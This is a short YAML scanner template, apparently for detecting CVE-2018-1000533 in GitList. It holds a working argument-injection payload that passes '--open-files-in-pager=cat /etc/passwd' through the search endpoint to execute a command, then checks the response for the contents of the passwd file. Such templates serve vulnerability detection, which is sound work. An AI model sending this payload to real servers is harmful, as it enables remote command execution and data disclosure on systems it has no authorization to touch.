cve-id: CVE-2018-1000533
rules:
  - method: GET
    path: /
    search: |
      <span class="name">(?P<project_name>.+?)</span>
    expression: |
      response.status == 200 && "gitlist".bmatches(response.body)
  - method: POST
    path: /{{project_name}}/tree/a/search
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      query=--open-files-in-pager=cat%20/etc/passwd
    expression: |
      response.status == 200 && response.body.bcontains(b"root:/root:/bin/bash")
severity:
  critical
type: 
  rce